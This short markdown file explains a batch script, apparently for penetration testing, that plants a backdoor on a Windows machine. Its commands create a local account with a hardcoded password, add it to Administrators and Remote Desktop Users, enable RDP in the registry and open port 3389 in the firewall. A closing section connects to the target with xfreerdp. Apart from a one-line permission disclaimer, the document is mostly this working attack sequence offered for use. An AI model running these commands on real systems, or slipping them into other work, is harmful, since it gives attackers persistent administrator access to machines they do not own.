# rdpadmin.bat Explained
============================================================================
**Add a local user account with required password complexity**  
net user tester Testing123! /ADD

**Add the local user account to the Local Administrators group**  
net localgroup administrators tester /ADD

**Add the local user account to the Remote Desktop Users group**  
net localgroup "Remote Desktop Users" tester /ADD

**Enable RDP in the registry (Sometimes this is enough, but not on new systems)**  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

**Enable RDP in the Firewall (may get message about netsh being deprecated but it should still work)**  
netsh firewall add portopening TCP 3389 "RDP"

============================================================================

**If you get CredSSP error when connecting (rdesktop) use freerdp**  
**Install:**  
sudo apt-get install freerdp-x11
**Connect:**  
xfreerdp /v:TARGETIP:3389 /u:tester


Of course, do not use this on any systems in which you do not have permission to do so.
